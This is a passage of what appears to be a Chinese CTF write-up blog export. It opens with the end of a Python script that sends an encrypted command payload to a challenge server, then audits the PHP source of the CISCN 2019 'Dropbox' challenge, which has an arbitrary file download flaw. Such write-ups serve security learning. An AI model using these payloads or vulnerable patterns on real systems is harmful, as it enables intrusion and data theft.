urllib.parse.quote(a.crypt(cmd))\nprint(payload)\nres = requests.get(url + payload)\nprint(res.text)\n```\n\n","slug":"buuoj刷题记录12-CISCN2019","published":1,"updated":"2020-02-09T16:04:17.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssfjw000cpk7e0p0o7h7z","content":"<h2 id=\"华北赛区-Day1-Web1-Dropbox\"><a href=\"#华北赛区-Day1-Web1-Dropbox\" class=\"headerlink\" title=\"华北赛区 Day1 Web1 Dropbox\"></a>华北赛区 Day1 Web1 Dropbox</h2><p>拿到题目是一个登入页面</p>\n<p>注册，登入，上传文件</p>\n<p>上传一个图片，上传成功。点击下载，下载时发现有任意文件下载漏洞</p>\n<p>把文件下载下来进行代码审计</p>\n<a id=\"more\"></a>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;index.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">if (!isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class=\"line\">    header(&quot;Location: login.php&quot;);</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class=\"line\">&lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, shrink-to-fit&#x3D;no&quot;&gt;</span><br><span class=\"line\">&lt;title&gt;网盘管理&lt;&#x2F;title&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">    &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;panel.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">    &lt;script src&#x3D;&quot;static&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">    &lt;script src&#x3D;&quot;static&#x2F;js&#x2F;bootstrap.bundle.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">    &lt;script src&#x3D;&quot;static&#x2F;js&#x2F;toast.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">    &lt;script src&#x3D;&quot;static&#x2F;js&#x2F;panel.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;nav aria-label&#x3D;&quot;breadcrumb&quot;&gt;</span><br><span class=\"line\">    &lt;ol class&#x3D;&quot;breadcrumb&quot;&gt;</span><br><span class=\"line\">        &lt;li class&#x3D;&quot;breadcrumb-item active&quot;&gt;管理面板&lt;&#x2F;li&gt;</span><br><span class=\"line\">        &lt;li class&#x3D;&quot;breadcrumb-item active&quot;&gt;&lt;label for&#x3D;&quot;fileInput&quot; class&#x3D;&quot;fileLabel&quot;&gt;上传文件&lt;&#x2F;label&gt;&lt;&#x2F;li&gt;</span><br><span class=\"line\">        &lt;li class&#x3D;&quot;active ml-auto&quot;&gt;&lt;a href&#x3D;&quot;#&quot;&gt;你好 &lt;?php echo $_SESSION[&#39;username&#39;]?&gt;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class=\"line\">    &lt;&#x2F;ol&gt;</span><br><span class=\"line\">&lt;&#x2F;nav&gt;</span><br><span class=\"line\">&lt;input type&#x3D;&quot;file&quot; id&#x3D;&quot;fileInput&quot; class&#x3D;&quot;hidden&quot;&gt;</span><br><span class=\"line\">&lt;div class&#x3D;&quot;top&quot; id&#x3D;&quot;toast-container&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">include &quot;class.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$a &#x3D; new FileList($_SESSION[&#39;sandbox&#39;]);</span><br><span class=\"line\">$a-&gt;Name();</span><br><span class=\"line\">$a-&gt;Size();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;download.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">if (!isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class=\"line\">    header(&quot;Location: login.php&quot;);</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if (!isset($_POST[&#39;filename&#39;])) &#123;</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">include &quot;class.php&quot;;</span><br><span class=\"line\">ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">chdir($_SESSION[&#39;sandbox&#39;]);</span><br><span class=\"line\">$file &#x3D; new File();</span><br><span class=\"line\">$filename &#x3D; (string) $_POST[&#39;filename&#39;];</span><br><span class=\"line\">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) &#x3D;&#x3D;&#x3D; false) &#123;   &#x2F;&#x2F;stristr 搜索字符串在另一字符串中的第一次出现不区分大小写</span><br><span class=\"line\">    Header(&quot;Content-type: application&#x2F;octet-stream&quot;);</span><br><span class=\"line\">    Header(&quot;Content-Disposition: attachment; filename&#x3D;&quot; . basename($filename));</span><br><span class=\"line\">    echo $file-&gt;close();</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    echo &quot;File not exist&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;delete.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">if (!isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class=\"line\">    header(&quot;Location: login.php&quot;);</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if (!isset($_POST[&#39;filename&#39;])) &#123;</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">include &quot;class.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">chdir($_SESSION[&#39;sandbox&#39;]);</span><br><span class=\"line\">$file &#x3D; new File();</span><br><span class=\"line\">$filename &#x3D; (string) $_POST[&#39;filename&#39;];</span><br><span class=\"line\">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class=\"line\">    $file-&gt;detele();</span><br><span class=\"line\">    Header(&quot;Content-type: application&#x2F;json&quot;);</span><br><span class=\"line\">    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;);</span><br><span class=\"line\">    echo json_encode($response);</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    Header(&quot;Content-type: application&#x2F;json&quot;);</span><br><span class=\"line\">    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;File not exist&quot;);</span><br><span class=\"line\">    echo json_encode($response);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;register.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">if (isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class=\"line\">    header(&quot;Location: index.php&quot;);</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!doctype html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">  &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class=\"line\">  &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, shrink-to-fit&#x3D;no&quot;&gt;</span><br><span class=\"line\">  &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class=\"line\">  &lt;title&gt;注册&lt;&#x2F;title&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;!-- Bootstrap core CSS --&gt;</span><br><span class=\"line\">  &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;style&gt;</span><br><span class=\"line\">    .bd-placeholder-img &#123;</span><br><span class=\"line\">      font-size: 1.125rem;</span><br><span class=\"line\">      text-anchor: middle;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @media (min-width: 768px) &#123;</span><br><span class=\"line\">      .bd-placeholder-img-lg &#123;</span><br><span class=\"line\">        font-size: 3.5rem;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &lt;&#x2F;style&gt;</span><br><span class=\"line\">  &lt;!-- Custom styles for this template --&gt;</span><br><span class=\"line\">  &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;std.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;body class&#x3D;&quot;text-center&quot;&gt;</span><br><span class=\"line\">  &lt;form class&#x3D;&quot;form-signin&quot; action&#x3D;&quot;register.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class=\"line\">    &lt;h1 class&#x3D;&quot;h3 mb-3 font-weight-normal&quot;&gt;注册&lt;&#x2F;h1&gt;</span><br><span class=\"line\">    &lt;label for&#x3D;&quot;username&quot; class&#x3D;&quot;sr-only&quot;&gt;Username&lt;&#x2F;label&gt;</span><br><span class=\"line\">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;Username&quot; required autofocus&gt;</span><br><span class=\"line\">    &lt;label for&#x3D;&quot;password&quot; class&#x3D;&quot;sr-only&quot;&gt;Password&lt;&#x2F;label&gt;</span><br><span class=\"line\">    &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;Password&quot; required&gt;</span><br><span class=\"line\">    &lt;button class&#x3D;&quot;btn btn-lg btn-primary btn-block&quot; type&#x3D;&quot;submit&quot;&gt;提交&lt;&#x2F;button&gt;</span><br><span class=\"line\">    &lt;p class&#x3D;&quot;mt-5 mb-3 text-muted&quot;&gt;&amp;copy; 2018-2019&lt;&#x2F;p&gt;</span><br><span class=\"line\">  &lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;div class&#x3D;&quot;top&quot; id&#x3D;&quot;toast-container&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;bootstrap.bundle.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;toast.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">include &quot;class.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;</span><br><span class=\"line\">    $u &#x3D; new User();</span><br><span class=\"line\">    $username &#x3D; (string) $_POST[&quot;username&quot;];</span><br><span class=\"line\">    $password &#x3D; (string) $_POST[&quot;password&quot;];</span><br><span class=\"line\">    if (strlen($username) &lt; 20 &amp;&amp; strlen($username) &gt; 2 &amp;&amp; strlen($password) &gt; 1) &#123;</span><br><span class=\"line\">        if ($u-&gt;add_user($username, $password)) &#123;</span><br><span class=\"line\">            echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;login.php?register&#39;;&lt;&#x2F;script&gt;&quot;);</span><br><span class=\"line\">            die();</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            echo &quot;&lt;script&gt;toast(&#39;此用户名已被使用&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class=\"line\">            die();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    echo &quot;&lt;script&gt;toast(&#39;请输入有效用户名和密码&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;class.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$dbaddr &#x3D; &quot;127.0.0.1&quot;;</span><br><span class=\"line\">$dbuser &#x3D; &quot;root&quot;;</span><br><span class=\"line\">$dbpass &#x3D; &quot;root&quot;;</span><br><span class=\"line\">$dbname &#x3D; &quot;dropbox&quot;;</span><br><span class=\"line\">$db &#x3D; new mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class=\"line\"></span><br><span class=\"line\">class User &#123;</span><br><span class=\"line\">    public $db;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct() &#123;</span><br><span class=\"line\">        global $db;</span><br><span class=\"line\">        $this-&gt;db &#x3D; $db;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function user_exist($username) &#123;</span><br><span class=\"line\">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;username&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ? LIMIT 1;&quot;);</span><br><span class=\"line\">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class=\"line\">        $stmt-&gt;execute();</span><br><span class=\"line\">        $stmt-&gt;store_result();</span><br><span class=\"line\">        $count &#x3D; $stmt-&gt;num_rows;</span><br><span class=\"line\">        if ($count &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function add_user($username, $password) &#123;</span><br><span class=\"line\">        if ($this-&gt;user_exist($username)) &#123;</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class=\"line\">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;INSERT INTO &#96;users&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;) VALUES (NULL, ?, ?);&quot;);</span><br><span class=\"line\">        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);</span><br><span class=\"line\">        $stmt-&gt;execute();</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function verify_user($username, $password) &#123;</span><br><span class=\"line\">        if (!$this-&gt;user_exist($username)) &#123;</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class=\"line\">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;password&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ?;&quot;);</span><br><span class=\"line\">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class=\"line\">        $stmt-&gt;execute();</span><br><span class=\"line\">        $stmt-&gt;bind_result($expect);</span><br><span class=\"line\">        $stmt-&gt;fetch();</span><br><span class=\"line\">        if (isset($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) &#123;</span><br><span class=\"line\">            return true;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __destruct() &#123;</span><br><span class=\"line\">        $this-&gt;db-&gt;close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class FileList &#123;</span><br><span class=\"line\">    private $files;</span><br><span class=\"line\">    private $results;</span><br><span class=\"line\">    private $funcs;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct($path) &#123;</span><br><span class=\"line\">        $this-&gt;files &#x3D; array();</span><br><span class=\"line\">        $this-&gt;results &#x3D; array();</span><br><span class=\"line\">        $this-&gt;funcs &#x3D; array();</span><br><span class=\"line\">        $filenames &#x3D; scandir($path);</span><br><span class=\"line\"></span><br><span class=\"line\">        $key &#x3D; array_search(&quot;.&quot;, $filenames);</span><br><span class=\"line\">        unset($filenames[$key]);   &#x2F;&#x2F;销毁变量</span><br><span class=\"line\">        $key &#x3D; array_search(&quot;..&quot;, $filenames);</span><br><span class=\"line\">        unset($filenames[$key]);</span><br><span class=\"line\"></span><br><span class=\"line\">        foreach ($filenames as $filename) &#123;</span><br><span class=\"line\">            $file &#x3D; new File();</span><br><span class=\"line\">            $file-&gt;open($path . $filename);</span><br><span class=\"line\">            array_push($this-&gt;files, $file);</span><br><span class=\"line\">            $this-&gt;results[$file-&gt;name()] &#x3D; array();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __call($func, $args) &#123;  &#x2F;&#x2F;调用本类不存在的方法，将方法添加到funcs数组中，并将file类中的</span><br><span class=\"line\">        array_push($this-&gt;funcs, $func);   </span><br><span class=\"line\">        foreach ($this-&gt;files as $file) &#123;</span><br><span class=\"line\">            $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __destruct() &#123;</span><br><span class=\"line\">        $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;</span><br><span class=\"line\">        $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;;</span><br><span class=\"line\">        foreach ($this-&gt;funcs as $func) &#123;</span><br><span class=\"line\">            $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;;</span><br><span class=\"line\">        $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;;</span><br><span class=\"line\">        foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123;</span><br><span class=\"line\">            $table .&#x3D; &#39;&lt;tr&gt;&#39;;</span><br><span class=\"line\">            foreach ($result as $func &#x3D;&gt; $value) &#123;</span><br><span class=\"line\">                $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;;    &#x2F;&#x2F;将$value转换为 HTML 实体</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            $table 